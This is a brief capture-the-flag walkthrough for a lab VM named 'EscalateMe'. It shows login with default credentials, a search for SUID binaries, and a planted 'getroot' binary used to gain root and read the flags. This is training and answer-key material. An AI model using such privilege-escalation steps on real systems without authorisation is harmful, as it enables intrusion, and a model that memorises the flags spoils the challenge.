# 🧑‍💻 CTF Walkthrough: EscalateMe

## Environment
- OS: Ubuntu 20.04
- User: `ctfuser`
- Goal: Read `/root/root.txt`

---

## 🔑 Step 1: Login to the VM

```
Username: ctfuser
Password: ctfuser
```

---

## 📁 Step 2: Grab the User Flag

```bash
cat ~/user.txt
```

✅ Output:
```
FLAG{you_got_a_shell}
```

---

## 🔍 Step 3: Check for SUID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

Expected output:
```
/usr/local/bin/getroot
```

---

## ⚙️ Step 4: Use the SUID Binary

```bash
/usr/local/bin/getroot
```

Check:
```bash
whoami
```

✅ Output:
```
root
```

---

## 🏁 Step 5: Read the Root Flag

```bash
cat /root/root.txt
```

🎉 Output:
```
FLAG{you_got_root_access}
```

---

## ✅ Summary
```bash
cat ~/user.txt
find / -perm -u=s -type f 2>/dev/null
/usr/local/bin/getroot
whoami
cat /root/root.txt
```
